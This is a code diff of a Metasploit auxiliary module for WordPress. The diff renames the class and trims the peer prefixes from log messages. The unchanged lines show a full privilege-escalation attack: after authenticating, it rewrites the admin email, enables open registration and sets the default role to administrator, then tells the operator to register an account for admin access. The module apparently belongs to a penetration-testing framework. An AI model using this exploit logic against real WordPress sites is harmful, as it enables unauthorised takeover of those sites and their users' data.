@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Wordpress
 
   def initialize(info = {})
@@ -65,44 +65,44 @@ class Metasploit3 < Msf::Auxiliary
     )
 
     if res.nil?
-      vprint_error("#{peer} - No response from the target.")
+      vprint_error("No response from the target.")
     elsif res.code != 200
-      vprint_warning("#{peer} - Server responded with status code #{res.code}")
+      vprint_warning("Server responded with status code #{res.code}")
     end
 
     res
   end
 
   def run
-    print_status("#{peer} - Authenticating with WordPress using #{username}:#{password}...")
+    print_status("Authenticating with WordPress using #{username}:#{password}...")
     cookie = wordpress_login(username, password)
     if cookie.nil?
-      print_error("#{peer} - Failed to authenticate with WordPress")
+      print_error("Failed to authenticate with WordPress")
       return
     end
-    print_good("#{peer} - Authenticated with WordPress")
+    print_good("Authenticated with WordPress")
 
     new_email = "#{Rex::Text.rand_text_alpha(5)}@#{Rex::Text.rand_text_alpha(5)}.com"
-    print_status("#{peer} - Changing admin e-mail address to #{new_email}...")
+    print_status("Changing admin e-mail address to #{new_email}...")
     if set_wp_option('admin_email', new_email, cookie).nil?
-      print_error("#{peer} - Failed to change the admin e-mail address")
+      print_error("Failed to change the admin e-mail address")
       return
     end
 
-    print_status("#{peer} - Enabling user registrations...")
+    print_status("Enabling user registrations...")
     if set_wp_option('users_can_register', 1, cookie).nil?
-      print_error("#{peer} - Failed to enable user registrations")
+      print_error("Failed to enable user registrations")
       return
     end
 
-    print_status("#{peer} - Setting the default user role...")
+    print_status("Setting the default user role...")
     if set_wp_option('default_role', 'administrator', cookie).nil?
-      print_error("#{peer} - Failed to set the default user role")
+      print_error("Failed to set the default user role")
       return
     end
 
     register_url = normalize_uri(target_uri.path, 'wp-login.php?action=register')
-    print_good("#{peer} - Privilege escalation complete")
-    print_good("#{peer} - Create a new account at #{register_url} to gain admin access.")
+    print_good("Privilege escalation complete")
+    print_good("Create a new account at #{register_url} to gain admin access.")
   end
 end
